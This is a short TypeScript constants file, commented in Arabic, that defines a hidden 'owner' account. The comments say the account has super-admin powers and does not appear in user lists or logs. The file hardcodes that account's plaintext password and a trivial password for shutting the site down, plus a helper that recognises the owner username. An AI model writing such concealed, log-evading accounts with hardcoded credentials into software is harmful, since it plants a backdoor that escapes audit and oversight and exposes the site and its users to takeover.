/** حساب المالك المخفي — صلاحيات سوبر أدمن دون ظهور في القوائم أو السجلات */
export const OWNER_USERNAME = "owner";
export const OWNER_PASSWORD = "hhamza12";

/** تأكيد تفعيل/إيقاف وضع الصيانة من صفحة المالك */
export const SITE_SHUTDOWN_CONFIRM_PASSWORD = "xyz";

export function isOwnerUsername(username: string | undefined | null): boolean {
  return (username ?? "").trim().toLowerCase() === OWNER_USERNAME.toLowerCase();
}
